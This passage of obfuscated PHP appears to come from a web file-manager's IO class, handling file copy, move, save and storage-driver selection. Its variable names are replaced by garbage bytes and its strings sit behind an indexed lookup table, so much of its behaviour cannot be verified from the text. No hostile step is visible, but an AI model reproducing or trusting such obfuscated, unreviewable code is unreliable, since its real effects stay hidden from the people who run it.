$ìÎÚÚŞï[643] || $Ü˜†ï™Í == $ìÎÚÚŞï[1266]) { if (!trim($‹÷­ÍÓ->path . $ìÎÚÚŞï[471], $ìÎÚÚŞï[18])) { return !1; } } if (method_exists($‹÷­ÍÓ, $Ü˜†ï™Í)) { $Ü¹®áŠÊ = @call_user_func_array(array($‹÷­ÍÓ, $Ü˜†ï™Í), $‰Ñö¦ß); } else { if (method_exists($‹÷­ÍÓ, $ìÎÚÚŞï[1267])) { $Ü¹®áŠÊ = @call_user_func_array(array($‹÷­ÍÓ, $Ü˜†ï™Í), $‰Ñö¦ß); } else { if (method_exists(self, $Ü˜†ï™Í)) { $Ü¹®áŠÊ = @call_user_func_array(array(self, $Ü˜†ï™Í), $‰Ñö¦ß); } else { $Ü¹®áŠÊ = call_user_func_array(array(parent, $Ü˜†ï™Í), $‰Ñö¦ß); } } } Hook::trigger($ìÎÚÚŞï[1264] . $Ü˜†ï™Í . $ìÎÚÚŞï[1268], $üŸš­ÁÎ, $Ü¹®áŠÊ); return $Ü¹®áŠÊ; } public static function init($â§œ¿Ñ¿) { return self::driverMake($â§œ¿Ñ¿); } public static function copy($µšŞ­°º, $”Õ¾š¼°, $ô–£ó£² = false, $ï«ºÍÒæ = false) { return self::copyMoveStart($µšŞ­°º, $”Õ¾š¼°, $ô–£ó£², $_SERVER[‰‰Ş‚€][641], $ï«ºÍÒæ); } public static function move($¤ÜŞ’Ú•, $×·¯Õ¨, $òØÈ´Ò = false, $Ûê¾Æûä = false) { return self::copyMoveStart($¤ÜŞ’Ú•, $×·¯Õ¨, $òØÈ´Ò, $_SERVER[‰‰Ş‚€][643], $Ûê¾Æûä); } public static function copyMoveChildren($„Û ó™œ, $¿³ÂÈÄ, $³ı¤Œšû = "\x63\157\x70\171", $ïÃÉµ = REPEAT_REPLACE) { $õ©–Óà¥ =& $_SERVER[‰‰Ş‚€]; $ñÎÏâ = $„Û ó™œ; $ÛíÅÏÑ = self::driverMake($„Û ó™œ); $€Õú„… = $ÛíÅÏÑ->listPath($„Û ó™œ, !0); $ı¬ÊÄÅ = array_merge($€Õú„…[$õ©–Óà¥[96]], $€Õú„…[$õ©–Óà¥[95]]); foreach ($ı¬ÊÄÅ as $ÒÓÒá÷) { self::copyMoveStart($ÒÓÒá÷[$õ©–Óà¥[97]], $¿³ÂÈÄ, $ïÃÉµ, $³ı¤Œšû, !1); } if ($³ı¤Œšû == $õ©–Óà¥[643]) { self::remove($ñÎÏâ); } } private static function copyMoveStart($şÆÂÉËÑ, $õòÕŞäÀ, $›óÆş›È, $­¶›¿İ², $à¯Èç¼Š) { $‰º¼“ÏŸ =& $_SERVER[‰‰Ş‚€]; $„íÈ…ÉÉ = array($şÆÂÉËÑ, $õòÕŞäÀ, $›óÆş›È, $à¯Èç¼Š); Hook::trigger($‰º¼“ÏŸ[1264] . $­¶›¿İ² . $‰º¼“ÏŸ[1265], $„íÈ…ÉÉ); $€§ú‘³£ = self::copyMove($şÆÂÉËÑ, $õòÕŞäÀ, $›óÆş›È, $­¶›¿İ², $à¯Èç¼Š); Hook::trigger($‰º¼“ÏŸ[1264] . $­¶›¿İ² . $‰º¼“ÏŸ[1268], $„íÈ…ÉÉ, $€§ú‘³£); return $€§ú‘³£; } public static function saveFile($ú·ûŞ Ÿ, $ÜúêãİÈ, $ø‹ÜÕû = true) { $–æàŞÎ™ =& $_SERVER[‰‰Ş‚€]; $´œ—Ôî = self::info($ÜúêãİÈ); $†¬¥Ù—­ = self::driverMake($ú·ûŞ Ÿ); $€Æòğ³ù = self::driverMake($ÜúêãİÈ); $‚õ–¦Çµ = !1; if ($€Æòğ³ù->pathParse[$–æàŞÎ™[1269]]) { $‚õ–¦Çµ = $€Æòğ³ù; $ŠïÚ›£ = $€Æòğ³ù->pathParse[$–æàŞÎ™[1269]]; $€Æòğ³ù = self::driverMake($ŠïÚ›£); } if ($†¬¥Ù—­->pathParse[$–æàŞÎ™[1269]]) { $Â†‹õ¨µ = $†¬¥Ù—­->pathParse[$–æàŞÎ™[1269]]; $†¬¥Ù—­ = self::driverMake($Â†‹õ¨µ); } $ÚŒà¿‚ = $€Æòğ³ù->pathFather($ÜúêãİÈ); $ƒÍÄ®„ = !0; if (!$ø‹ÜÕû && self::driverIsSame($†¬¥Ù—­, $€Æòğ³ù)) { $ƒÍÄ®„ = !1; } $şéÃë•Î = self::copyFile($†¬¥Ù—­, $ú·ûŞ Ÿ, $€Æòğ³ù, $ÚŒà¿‚, $´œ—Ôî[$–æàŞÎ™[42]], $ƒÍÄ®„); if ($‚õ–¦Çµ) { $şéÃë•Î = $‚õ–¦Çµ->getPathOuter($şéÃë•Î); } return $şéÃë•Î; } private static function copyMove($Ã‰çì˜ã, $¢ÚÓ¤¨¾, $®ˆŞŸŸ», $‡µÉ§Â÷, $¶ íãê = false) { $İ…¾€ =& $_SERVER[‰‰Ş‚€]; if (!$Ã‰çì˜ã || $Ã‰çì˜ã == $İ…¾€[18] || !$¢ÚÓ¤¨¾) { return !1; } ignore_timeout(); $Ûæ÷Ü§ = self::driverMake($Ã‰çì˜ã); $é«ƒ„ş¾ = self::driverMake($¢ÚÓ¤¨¾); $®õ»úüÌ = $‡µÉ§Â÷ == $İ…¾€[643]; $ÌÊÛ°¼ = !1; if ($é«ƒ„ş¾->pathParse[$İ…¾€[1269]]) { $ÌÊÛ°¼ = $é«ƒ„ş¾; $¢ÚÓ¤¨¾ = $é«ƒ„ş¾->pathParse[$İ…¾€[1269]]; $é«ƒ„ş¾ = self::driverMake($¢ÚÓ¤¨¾); } if ($Ûæ÷Ü§->pathParse[$İ…¾€[1269]]) { $Ã‰çì˜ã = $Ûæ÷Ü§->pathParse[$İ…¾€[1269]]; $Ûæ÷Ü§ = self::driverMake($Ã‰çì˜ã); } self::check($Ûæ÷Ü§, $Ã‰çì˜ã, $é«ƒ„ş¾, $¢ÚÓ¤¨¾); Hook::trigger($İ…¾€[1270], $Ûæ÷Ü§, $Ã‰çì˜ã, $é«ƒ„ş¾, $¢ÚÓ¤¨¾); $ô“•àø· = self::driverIsSame($Ûæ÷Ü§, $é«ƒ„ş¾); if ($ô“•àø·) { if ($‡µÉ§Â÷ == $İ…¾€[643] && !method_exists($é«ƒ„ş¾, $İ…¾€[1271]) && trim($¢ÚÓ¤¨¾, $İ…¾€[18]) == trim($é«ƒ„ş¾->pathFather($Ã‰çì˜ã), $İ…¾€[18])) { if ($Ûæ÷Ü§->pathThis($Ã‰çì˜ã) != $¶ íãê && !$Ûæ÷Ü§->isOsDriver()) { return $Ûæ÷Ü§->rename($Ã‰çì˜ã, $¶ íãê); } return $é«ƒ„ş¾->getPathOuter($Ã‰çì˜ã); } if (method_exists($é«ƒ„ş¾, $‡µÉ§Â÷)) { return $é«ƒ„ş¾->{$‡µÉ§Â÷}($Ã‰çì˜ã, $¢ÚÓ¤¨¾, $®ˆŞŸŸ», $¶ íãê); } } if ($ô“•àø· && $‡µÉ§Â÷ == $İ…¾€[643] && $é«ƒ„ş¾->getType() == $İ…¾€[117]) { $ùì§˜ô = $é«ƒ„ş¾->movePath($Ã‰çì˜ã, $¢ÚÓ¤¨¾, $¶ íãê); if ($ùì§˜ô) { return $ùì§˜ô; } } $°ŒÑğ€¹ = $Ûæ÷Ü§->isFile($Ã‰çì˜ã); if (!$°ŒÑğ€¹ && $é«ƒ„ş¾->getType() == $İ…¾€[854] && $Ûæ÷Ü§->getType() == $İ…¾€[117]) { $ùì§˜ô = $é«ƒ„ş¾->copyFolderFromIO($Ûæ÷Ü§, $Ã‰çì˜ã, $¢ÚÓ¤¨¾, $®ˆŞŸŸ», $®õ»úüÌ, $¶ íãê); } else { $ùì§˜ô = self::copyPath($Ûæ÷Ü§, $Ã‰çì˜ã, $é«ƒ„ş¾, $¢ÚÓ¤¨¾, $®ˆŞŸŸ», $®õ»úüÌ, $°ŒÑğ€¹, $¶ íãê); } if ($ùì§˜ô && $®õ»úüÌ) { $Ûæ÷Ü§->remove($Ã‰çì˜ã); } if ($ÌÊÛ°¼) { $ùì§˜ô = $ÌÊÛ°¼->getPathOuter($ùì§˜ô); } return $ùì§˜ô; } private static function check($İûİöêµ, $Ë¦¯Ö¦¯, $ğ¯¨ú÷­, &$ÊÉ¨ıÕ) { $ÒğÉã‘Œ =& $_SERVER[‰‰Ş‚€]; if (self::driverIsSame($İûİöêµ, $ğ¯¨ú÷­) && $İûİöêµ->isFolder($Ë¦¯Ö¦¯) && $İûİöêµ->isParentOf($Ë¦¯Ö¦¯, $ÊÉ¨ıÕ)) { show_json(LNG($ÒğÉã‘Œ[1272]), !1); } if (!$İûİöêµ->exist($Ë¦¯Ö¦¯)) { show_json(LNG($ÒğÉã‘Œ[116]), !1); } } private static function copyPath($¸¢§­¯Ç, $¼­ûÅÉ, $Ÿ£º¶×, $™äõà©Ï, $õ´Ø½»à, $øŸ­É¢, $ğ“Ô´İÆ, $¦ìÑŸ®· = false, $Æ¥¤óÃ² = true) { $¸ˆó±Ûá =& $_SERVER[‰‰Ş‚€]; $úÓù‹Ä = empty($¦ìÑŸ®·) && $¦ìÑŸ®· !== $¸ˆó±Ûá[239] ? $¸¢§­¯Ç->pathThis($¼­ûÅÉ) : $¦ìÑŸ®·; if ($õ´Ø½»à) { $‹Ÿù¢Ô° = $Ÿ£º¶×->fileNameExist($™äõà©Ï, $úÓù‹Ä); $«ÍòŒäÌ = $úÓù‹Ä; $úÓù‹Ä = $Ÿ£º¶×->fileNameAuto($™äõà©Ï, $úÓù‹Ä, $õ´Ø½»à, !$ğ“Ô´İÆ); if (!$‹Ÿù¢Ô° || $«ÍòŒäÌ != $úÓù‹Ä) { $õ´Ø½»à = !1; } if ($Æ¥¤óÃ² && !$õ´Ø½»à) { $Ÿ£º¶×->_data[$¸ˆó±Ûá[1273]] = !0; } } if ($ğ“Ô´İÆ) { return self::copyFile($¸¢§­¯Ç, $¼­ûÅÉ, $Ÿ£º¶×, $™äõà©Ï, $úÓù‹Ä, $øŸ­É¢); } if ($õ´Ø½»à == REPEAT_RENAME_FOLDER) { $õ´Ø½»à = !1; } $¦ò»»Î = rtrim($™äõà©Ï, $¸ˆó±Ûá[18]) . $¸ˆó±Ûá[18] . $úÓù‹Ä; $õ¢Çâëí = $Ÿ£º¶×->mkdir($Ÿ£º¶×->getPath($¦ò»»Î), $õ´Ø½»à); $™äõà©Ï = $Ÿ£º¶×->getPathInner($õ¢Çâëí); $£í’…Æ„ = $¸¢§­¯Ç->listPath($¼­ûÅÉ, !0); $£í’…Æ„ = is_array($£í’…Æ„) ? $£í’…Æ„ : array($¸ˆó±Ûá[96] => array(), $¸ˆó±Ûá[95] => array()); $Õ¼™±í› = array_merge($£í’…Æ„[$¸ˆó±Ûá[96]], $£í’…Æ„[$¸ˆó±Ûá[95]]); foreach ($Õ¼™±í› as $Ûœè—•¬) { $Û„¦óœ× = $Ûœè—•¬[$¸ˆó±Ûá[43]] == $¸ˆó±Ûá[241]; $¼­ûÅÉ = $¸¢§­¯Ç->getPathInner($Ûœè—•¬[$¸ˆó±Ûá[97]]); $¸—·ÓÀ = self::copyPath($¸¢§­¯Ç, $¼­ûÅÉ, $Ÿ£º¶×, $™äõà©Ï, $õ´Ø½»à, $øŸ­É¢, $Û„¦óœ×, !1, !1); if (!$¸—·ÓÀ) { IO::errorTips($¸ˆó±Ûá[1274] . $¼­ûÅÉ . $¸ˆó±Ûá[83] . $™äõà©Ï); } } self::copyMoveKeepInfo($¸¢§­¯Ç, $¼­ûÅÉ, $õ¢Çâëí); return $õ¢Çâëí; } private static function copyFile($€Ÿƒ­­÷, $Ãèç±Èë, $¥î‰è Ñ, $É•‡Áã, $áî¿›°Ô, $¡üô­’Ğ) { $è™ê½Ê =& $_SERVER[‰‰Ş‚€]; $É•‡Áã = $¥î‰è Ñ->getPath(rtrim($É•‡Áã, $è™ê½Ê[18]) . $è™ê½Ê[18] . $áî¿›°Ô); $‹‘ŠÅ„« = $è™ê½Ê[1275] . time() . rand_string(5); Hook::trigger($è™ê½Ê[1276], $€Ÿƒ­­÷, $Ãèç±Èë, $¥î‰è Ñ, $É•‡Áã, $áî¿›°Ô, $‹‘ŠÅ„«); if (self::driverIsSame($€Ÿƒ­­÷, $¥î‰è Ñ)) { if ($¡üô­’Ğ) { $¼ıùÕéá = $¥î‰è Ñ->moveFile($Ãèç±Èë, $É•‡Áã); } else { $¼ıùÕéá = $¥î‰è Ñ->copyFile($Ãèç±Èë, $É•‡Áã); } Hook::trigger($è™ê½Ê[1277], $€Ÿƒ­­÷, $Ãèç±Èë, $¥î‰è Ñ, $É•‡Áã, $áî¿›°Ô, $¼ıùÕéá); self::copyMoveKeepInfo($€Ÿƒ­­÷, $Ãèç±Èë, $¼ıùÕéá); return $¼ıùÕéá; } $ÊÛ›¡´™ = TEMP_FILES; if ($GLOBALS[$è™ê½Ê[16]][$è™ê½Ê[102]][$è™ê½Ê[897]]) { $ÊÛ›¡´™ = $GLOBALS[$è™ê½Ê[16]][$è™ê½Ê[102]][$è™ê½Ê[897]]; } $²º“¡ = $ÊÛ›¡´™; mk_dir($²º“¡); $äœ‰³ú = $²º“¡ . $‹‘ŠÅ„«; $¢ã½¡—Õ = $äœ‰³ú; $äœ‰³ú = $€Ÿƒ­­÷->download($Ãèç±Èë, $äœ‰³ú); $äœ‰³ú = $€Ÿƒ­­÷->iconvApp($äœ‰³ú); if (substr($äœ‰³ú, strlen($ÊÛ›¡´™)) == $ÊÛ›¡´™) { $¡üô­’Ğ = !0; } $¼ıùÕéá = $¥î‰è Ñ->upload($É•‡Áã, $äœ‰³ú, $¡üô­’Ğ); self::remove($¢ã½¡—Õ); Hook::trigger($è™ê½Ê[1277], $€Ÿƒ­­÷, $Ãèç±Èë, $¥î‰è Ñ, $É•‡Áã, $áî¿›°Ô, $¼ıùÕéá); self::copyMoveKeepInfo($€Ÿƒ­­÷, $Ãèç±Èë, $¼ıùÕéá); return $¼ıùÕéá; } private static function copyMoveKeepInfo($ï¼âƒ’ô, $—·”ö“Š, $ÂüˆØ‘È) { if (!$ÂüˆØ‘È) { return; } $Á«ùæ = $ï¼âƒ’ô->info($—·”ö“Š); if (!is_array($Á«ùæ)) { return; } IO::setModifyTime($ÂüˆØ‘È, $Á«ùæ[$_SERVER[‰‰Ş‚€][98]]); } public static function pathFather($ã‡É¨Öè) { $¶ßĞ£—ó = IO::init($ã‡É¨Öè); $„‹Şİ‡× = $¶ßĞ£—ó->pathFather($¶ßĞ£—ó->path); return $¶ßĞ£—ó->getPathOuter($„‹Şİ‡×); } public static function fileOut($’ÊŒ®È¬, $òÆã¬Şå = false, $¡í¥ÀıÛ = false, $Š©¤ì£ƒ = '') { $ÓÌ”Èæ = self::driverMake($’ÊŒ®È¬); if ($ÓÌ”Èæ->isFileOutServer()) { return $ÓÌ”Èæ->fileOutServer($’ÊŒ®È¬, $òÆã¬Şå, $¡í¥ÀıÛ, $Š©¤ì£ƒ); } return $ÓÌ”Èæ->fileOut($’ÊŒ®È¬, $òÆã¬Şå, $¡í¥ÀıÛ, $Š©¤ì£ƒ); } public static function fileOutImage($¶ê—·ó‹, $ƒ§¦® = 250) { $±Åãœıö = array(250, 600, 1200, 2000, 3000, 5000); for ($ª¿¦¦¤¢ = 0; $ª¿¦¦¤¢ < count($±Åãœıö); $ª¿¦¦¤¢++) { if ($ª¿¦¦¤¢ == 0 && $ƒ§¦® <= $±Åãœıö[$ª¿¦¦¤¢]) { $ƒ§¦® = $±Åãœıö[$ª¿¦¦¤¢]; break; } else { if ($ƒ§¦® > $±Åãœıö[$ª¿¦¦¤¢ - 1] && $ƒ§¦® <= $±Åãœıö[$ª¿¦¦¤¢]) { $ƒ§¦® = $±Åãœıö[$ª¿¦¦¤¢]; break; } else { if ($ª¿¦¦¤¢ == count($±Åãœıö) - 1 && $ƒ§¦® > $±Åãœıö[$ª¿¦¦¤¢]) { $ƒ§¦® = $±Åãœıö[$ª¿¦¦¤¢]; break; } } } } $—şŠÁë = self::driverMake($¶ê—·ó‹); if ($—şŠÁë->isFileOutServer()) { return $—şŠÁë->fileOutImageServer($¶ê—·ó‹, $ƒ§¦®); } return $—şŠÁë->fileOutImage($¶ê—·ó‹, $ƒ§¦®); } private static function driverIsSame($ñÁÆàµ„, $Æ…·´¥Õ) { $’ÅµÊÈÑ =& $_SERVER[‰‰Ş‚€]; $õ‰÷Ãê = $ñÁÆàµ„->getType(); $ãÊõ²Š¡ = $Æ…·´¥Õ->getType(); if ($õ‰÷Ãê != $ãÊõ²Š¡) { return !1; } if ($õ‰÷Ãê == $’ÅµÊÈÑ[854]) { return !0; } if ($õ‰÷Ãê == $’ÅµÊÈÑ[117]) { return !0; } if ($ñÁÆàµ„->pathDriver == $Æ…·´¥Õ->pathDriver) { return !0; } return !1; } public static function copyUpdate($–©á¬±«, $æ¦àÌ£§) { $×Á­ÓšÛ =& $_SERVER[‰‰Ş‚€]; if (!IO::exist($–©á¬±«)) { return !1; } if (!IO::exist($æ¦àÌ£§)) { IO::mkdir($æ¦àÌ£§); } $Ÿ‹ÄÁÁÚ = array_to_keyvalue(self::listAllSimple($–©á¬±«), $×Á­ÓšÛ[97]); $×±¬‘Íß = array_to_keyvalue(self::listAllSimple($æ¦àÌ£§), $×Á­ÓšÛ[97]); $ÀİÉ‘¦ğ = array(); $Ê•…œ¯Ö = array(); foreach ($Ÿ‹ÄÁÁÚ as $İşÈ­¡ => $º„€Å—¢) { if (isset($×±¬‘Íß[$İşÈ­¡])) { if ($º„€Å—¢[$×Á­ÓšÛ[88]] == 1) { continue; } if ($×±¬‘Íß[$İşÈ­¡][$×Á­ÓšÛ[89]] == $º„€Å—¢[$×Á­ÓšÛ[89]]) { continue; } } if ($º„€Å—¢[$×Á­ÓšÛ[88]] == 1) { $Ê•…œ¯Ö[] = $æ¦àÌ£§ . $×Á­ÓšÛ[18] . trim($İşÈ­¡, $×Á­ÓšÛ[18]); continue; } $³©ÃûÇ = strstr(trim($İşÈ­¡, $×Á­ÓšÛ[18]), $×Á­ÓšÛ[18]) ? get_path_father($İşÈ­¡) : $×Á­ÓšÛ[22]; $ÀİÉ‘¦ğ[] = array($×Á­ÓšÛ[1278] => $º„€Å—¢[$×Á­ÓšÛ[99]], $×Á­ÓšÛ[1279] => rtrim($æ¦àÌ£§, $×Á­ÓšÛ[18]) . $×Á­ÓšÛ[18] . $³©ÃûÇ, $×Á­ÓšÛ[1280] => $º„€Å—¢); } $ÅÑØˆã… = array($×Á­ÓšÛ[241] => $ÀİÉ‘¦ğ, $×Á­ÓšÛ[88] => $Ê•…œ¯Ö); Hook::trigger($×Á­ÓšÛ[1281], $–©á¬±«, $æ¦àÌ£§, $ÅÑØˆã…); foreach ($Ê•…œ¯Ö as $º„€Å—¢) { IO::mkdir($º„€Å—¢); } foreach ($ÀİÉ‘¦ğ as $º„€Å—¢) { IO::copy($º„€Å—¢[$×Á­ÓšÛ[1278]], $º„€Å—¢[$×Á­ÓšÛ[1279]], REPEAT_REPLACE); } } public static function fileSubstr($·±›È…, $åªãªì€, $ı ßØ£û = false) { $Ôßˆ›Š =& $_SERVER[‰‰Ş‚€]; $£½ìøüæ = self::driverMake($·±›È…); $£¿†ñà = $£½ìøüæ->size($·±›È…); $…£·„ıÏ = $åªãªì€; $†ÄşÚŒ = $ı ßØ£û; if ($åªãªì€ < 0) { $åªãªì€ = $£¿†ñà + $åªãªì€; } if ($ı ßØ£û === !1) { $ı ßØ£û = $£¿†ñà - $åªãªì€; } if ($åªãªì€ + $ı ßØ£û > $£¿†ñà) { $ı ßØ£û = $£¿†ñà - $åªãªì€; } if (!$£¿†ñà && $£½ìøüæ->getType() == $Ôßˆ›Š[117] && !$£½ìøüæ->exist($·±›È…)) { $Í™à¦°¸ = get_path_this($·±›È…); $ÄûÀ¤€ = parse_url_query($Í™à¦°¸); if (is_array($ÄûÀ¤€) && isset($ÄûÀ¤€[$Ôßˆ›Š[42]])) { $Í™à¦°¸ = urldecode($ÄûÀ¤€[$Ôßˆ›Š[42]]); } throw new Exception($Ôßˆ›Š[1282] . LNG($Ôßˆ›Š[1283]) . $Ôßˆ›Š[1076] . clear_html($Í™à¦°¸) . $Ôßˆ›Š[22]); } if ($ı ßØ£û <= 0) { return $Ôßˆ›Š[22]; } if ($åªãªì€ < 0 || $åªãªì€ >= $£¿†ñà || $ı ßØ£û > $GLOBALS[$Ôßˆ›Š[16]][$Ôßˆ›Š[102]][$Ôßˆ›Š[1284]]) { throw new Exception("\146\151\154\x65\x52\145\x61\144\x20\145\162\x72\x6f\x72\x2c\157\x76\145\162\40\x69\157\x52\145\141\144\x4d\x61\170\41\x20\163\x74\x61\162\164\x3d{$åªãªì€}\73\x6c\x65\156\147\x74\150\75{$ı ßØ£û}\73\40\x73\x69\172\145\75{$£¿†ñà}\x3b"); } $µ¸ïÊİ… = $£½ìøüæ->fileSubstr($·±›È…, $åªãªì€, $ı ßØ£û); if (!$µ¸ïÊİ… && $ı ßØ£û && isset($GLOBALS[$Ôßˆ›Š[1285]])) { throw new Exception($GLOBALS[$Ôßˆ›Š[1285]][$Ôßˆ›Š[1286]]); } return $µ¸ïÊİ…; } private static function driverMake(&$¡³äŸ™ß) { $£ıÙšß“ =& $_SERVER[‰‰Ş‚€]; $¢´¯œ×â = KodIO::parse($¡³äŸ™ß); if (!self::$driverListSystem) { $áóªŸ¯ = Model($£ıÙšß“[864])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($áóªŸ¯, $£ıÙšß“[491]); } if ($¢´¯œ×â[$£ıÙšß“[43]] == KodIO::KOD_IO && !self::$driverListSystem[$¢´¯œ×â[$£ıÙšß“[491]]]) { throw new Exception($£ıÙšß“[1287]); return !1; } $¡³äŸ™ß = $¢´¯œ×â[$£ıÙšß“[1288]]; $¼´Âôş´ = self::driverGet($¢´¯œ×â, $¡³äŸ™ß); return $¼´Âôş´; } private static function driverGet($¥¦Ç¡ÏÁ, &$˜­šï¨) { $—ë‘Í…­ =& $_SERVER[‰‰Ş‚€]; $Ğƒ·ùÈª = $¥¦Ç¡ÏÁ[$—ë‘Í…­[1289]]; $‰µ¾ËˆØ = $¥¦Ç¡ÏÁ[$—ë‘Í…­[491]]; switch ($¥¦Ç¡ÏÁ[$—ë‘Í…­[43]]) { case KodIO::KOD_IO: $ÒçòËÒ¢ = self::$driverListSystem[$‰µ¾ËˆØ]; break; case KodIO::KOD_SOURCE: $˜­šï¨ = $‰µ¾ËˆØ . $˜­šï¨; $ÒçòËÒ¢ = array($—ë‘Í…­[1290] => $—ë‘Í…­[1291], $—ë‘Í…­[16] => $¥¦Ç¡ÏÁ); $ÒçòËÒ¢[$—ë‘Í…­[16]][$—ë‘Í…­[1292]] = $¥¦Ç¡ÏÁ[$—ë‘Í…­[491]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $îÅÂ‹ì¸ = $GLOBALS[$—ë‘Í…­[1293]]; self::$driverListUser = array_to_keyvalue($îÅÂ‹ì¸, $—ë‘Í…­[491]); } $ÒçòËÒ¢ = self::$driverListUser[$‰µ¾ËˆØ]; break; case KodIO::KOD_SHARE_LINK: $ÒçòËÒ¢ = array($—ë‘Í…­[1290] => $—ë‘Í…­[1294], $—ë‘Í…­[16] => $¥¦Ç¡ÏÁ); $©Ïª«ôß = Action($—ë‘Í…­[1295])->sharePathInfo($¥¦Ç¡ÏÁ[$—ë‘Í…­[97]]); $˜­šï¨ = $©Ïª«ôß[$—ë‘Í…­[202]]; if (!$©Ïª«ôß[$—ë‘Í…­[202]]) { $Ø™‰ï•Ò = Model($—ë‘Í…­[687])->getInfo($©Ïª«ôß[$—ë‘Í…­[688]]); $˜­šï¨ = KodIO::clear($Ø™‰ï•Ò[$—ë‘Í…­[1296]] . $¥¦Ç¡ÏÁ[$—ë‘Í…­[1288]]); $¥¦Ç¡ÏÁ[$—ë‘Í…­[580]] = $Ø™‰ï•Ò; $¥¦Ç¡ÏÁ[$—ë‘Í…­[1269]] = $˜­šï¨; $ÒçòËÒ¢ = array($—ë‘Í…­[1290] => $—ë‘Í…­[1297], $—ë‘Í…­[16] => $¥¦Ç¡ÏÁ); } else { $ÒçòËÒ¢[$—ë‘Í…­[16]][$—ë‘Í…­[1292]] = $©Ïª«ôß[$—ë‘Í…­[202]]; } break; case KodIO::KOD_SHARE_ITEM: $ÒçòËÒ¢ = array($—ë‘Í…­[1290] => $—ë‘Í…­[1298], $—ë‘Í…­[16] => $¥¦Ç¡ÏÁ); $Ø™‰ï•Ò = Model($—ë‘Í…­[687])->getInfo($¥¦Ç¡ÏÁ[$—ë‘Í…­[491]]); if ($Ø™‰ï•Ò[$—ë‘Í…­[202]] == $—ë‘Í…­[239]) { $˜­šï¨ = KodIO::clear($Ø™‰ï•Ò[$—ë‘Í…­[1296]] . $¥¦Ç¡ÏÁ[$—ë‘Í…­[1288]]); $¥¦Ç¡ÏÁ[$—ë‘Í…­[580]] = $Ø™‰ï•Ò; $¥¦Ç¡ÏÁ[$—ë‘Í…­[1269]] = $˜­šï¨; $ÒçòËÒ¢ = array($—ë‘Í…­[1290] => $—ë‘Í…­[1299], $—ë‘Í…­[16] => $¥¦Ç¡ÏÁ); } else { if (!$˜­šï¨) { $˜­šï¨ = $Ø™‰ï•Ò[$—ë‘Í…­[202]]; } $ÒçòËÒ¢[$—ë‘Í…­[16]][$—ë‘Í…­[1292]] = $Ø™‰ï•Ò[$—ë‘Í…­[202]]; } break; default: $˜­šï¨ = $¥¦Ç¡ÏÁ[$—ë‘Í…­[97]]; $ÒçòËÒ¢ = array($—ë‘Í…­[1290] => $—ë‘Í…­[1300]); break; } $ÑøŒö™Ù = $¥¦Ç¡ÏÁ[$—ë‘Í…­[97]]; if (!isset(self::$driverCache[$ÑøŒö™Ù])) { $Ì·›ä³° = strtolower($ÒçòËÒ¢[$—ë‘Í…­[106]]); $ä•©µö˜ = $GLOBALS[$—ë‘Í…­[16]][$—ë‘Í…­[102]][$—ë‘Í…­[930]]; $ş®ø‹Ç = $—ë‘Í…­[87] . (isset($ä•©µö˜[$Ì·›ä³°]) ? $ä•©µö˜[$Ì·›ä³°] : ucfirst($Ì·›ä³°)); if (!class_exists($ş®ø‹Ç)) { show_json("{$ş®ø‹Ç}\40\156\157\x74\40\145\x78\x69\x73\x74\x73\41", !1); } $ùè‘ÁŸ± = isset($ÒçòËÒ¢[$—ë‘Í…­[16]]) ? $ÒçòËÒ¢[$—ë‘Í…­[16]] : !1; self::$driverCache[$ÑøŒö™Ù] = new $ş®ø‹Ç($ùè‘ÁŸ±); } $ü¢Ššã = self::$driverCache[$ÑøŒö™Ù]; $ü¢Ššã->pathDriver = $Ğƒ·ùÈª; $ü¢Ššã->pathBase = $—ë‘Í…­[22]; if (isset($ÒçòËÒ¢[$—ë‘Í…­[16]][$—ë‘Í…­[1301]])) { $ü¢Ššã->pathBase = rtrim($ÒçòËÒ¢[$—ë‘Í…­[16]][$—ë‘Í…­[1301]], $—ë‘Í…­[18]) . $—ë‘Í…­[18]; $˜­šï¨ = $ü¢Ššã->pathBase . ltrim($˜­šï¨, $—ë‘Í…­[18]); } $˜­šï¨ = $ü¢Ššã->getPath($˜­šï¨); if (isset($¥¦Ç¡ÏÁ[$—ë‘Í…­[1269]])) { $˜­šï¨ = $¥¦Ç¡ÏÁ[$—ë‘Í…­[1269]]; } $ü¢Ššã->path = $˜­šï¨; return $ü¢Ššã; } public static function errorTips($«İ™´è‰ = false) { $úŒ„â¢ë =& $_SERVER[‰‰Ş‚€]; static $Ñãâ½¨µ = array(); $Å‡‘“› = 1000; if ($«İ™´è‰ === -1) { return $Ñãâ½¨µ ? $Ñãâ½¨µ[count($Ñãâ½¨µ) - 1] : $úŒ„â¢ë[22]; } if ($«İ™´è‰ === !1) { return implode($úŒ„â¢ë[10], $Ñãâ½¨µ); } if (count($Ñãâ½¨µ) >= $Å‡‘“›) { $Ñãâ½¨µ = array_slice($Ñãâ½¨µ, $Å‡‘“› * 0.5, $Å‡‘“›); } $Ñãâ½¨µ[] = $«İ™´è‰; write_log($úŒ„â¢ë[184] . ACTION . $úŒ„â¢ë[1302] . $«İ™´è‰, $úŒ„â¢ë[1303]); } public static function getLastError($Î»¼õ—Ş = '') { $”Ôø¶¸ = self::errorTips(-1); return $”Ôø¶¸ ? $”Ôø¶¸ : $Î»¼õ—Ş; } } goto Eøµê’Ø­Ë; Dæ²ìŠ´’: class PathDriverDriverShareItem { public function __construct($û«Á˜Ò) { $this->pathParse = $û«Á˜Ò; } public function __call($—óşµâ³, $€«œˆ³) { $šÆİ°ÉŸ =& $_SERVER[‰‰Ş‚€]; if (method_exists($this, $—óşµâ³)) { return; } $ßşû¼Ğ³ = call_user_func_array(array($šÆİ°ÉŸ[1476], $—óşµâ³), $€«œˆ³); $û“´ƒé = array($šÆİ°ÉŸ[1477], $šÆİ°ÉŸ[1478], $šÆİ°ÉŸ[1479], $šÆİ°ÉŸ[1480], $šÆİ°ÉŸ[641], $šÆİ°ÉŸ[643], $šÆİ°ÉŸ[1481], $šÆİ°ÉŸ[118], $šÆİ°ÉŸ[1482], $šÆİ°ÉŸ[1483]); if (in_array($—óşµâ³, $û“´ƒé)) { $ßşû¼Ğ³ = $this->getPathOuter($ßşû¼Ğ³); } return $ßşû¼Ğ³; } public function copy($‘°Ÿ±’®, $÷å£ÈÛÙ, $Šø™åÒŒ = false, $à ù—µ = false) { return $this->copyMove($‘°Ÿ±’®, $÷å£ÈÛÙ, $Šø™åÒŒ, $_SERVER[‰‰Ş‚€][641], $à ù—µ); } public function move($Æ¤‚İ‰•, $ƒÃ¡Äèì, $àò†ê„Ş = false, $—œ¨”‰¬ = false) { return $this->copyMove($Æ¤‚İ‰•, 